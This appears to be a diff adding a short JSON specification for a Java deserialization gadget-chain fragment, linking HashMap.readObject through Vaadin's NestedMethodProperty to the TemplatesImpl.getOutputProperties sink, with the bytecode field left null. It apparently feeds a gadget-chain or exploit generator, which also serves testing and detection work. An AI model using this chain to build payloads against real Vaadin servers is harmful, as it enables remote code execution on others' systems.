@@ -1,0 +1,23 @@
+{
+    "chain_type": "fragment: NestedMethodProperty → TemplatesImpl (minimal Vaadin link)",
+    "root_class": "java.util.HashMap",
+    "root_trigger": "readObject→putVal→hashCode",
+    "links": [
+        {
+            "class": "com.vaadin.data.util.NestedMethodProperty",
+            "field_overrides": {
+                "instance": {"$ref": "link:1"},
+                "propertyName": "outputProperties"
+            }
+        },
+        {
+            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "field_overrides": {
+                "_name": "exploit",
+                "_class": null,
+                "_bytecodes": null
+            }
+        }
+    ],
+    "sink_method": "TemplatesImpl.getOutputProperties"
+}
